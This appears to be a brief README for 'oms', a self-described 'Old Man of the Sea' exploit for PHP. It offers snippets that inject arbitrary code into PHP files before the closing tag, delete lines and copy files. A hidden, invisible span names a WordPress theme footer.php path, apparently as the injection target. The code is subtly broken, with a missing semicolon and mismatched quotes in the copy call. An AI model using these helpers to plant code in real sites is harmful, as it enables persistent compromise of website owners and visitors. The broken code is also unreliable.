# oms
 An "Old Man of the Sea" based exploit on PHP

#helpful usages

<pre>
//adding
$data="echo 'hello world!'";
$filecontent=file_get_contents('file.php')
$pos=strpos($filecontent, '?>');
$filecontent=substr($filecontent, 0, $pos)."\r\n".$data."\r\n".substr($filecontent, $pos);
echo file_put_contents("file.php", $filecontent);

 
//removing lines
$row_number = 22;
$file_out = file("file.php");
unset($file_out[$row_number]);
file_put_contents("file.php", implode("", $file_out));


//copying
echo copy("file.php,"target.php");
</pre>

<span style="opacity:0">../wp-content/themes/cooltheme/footer.php</span>
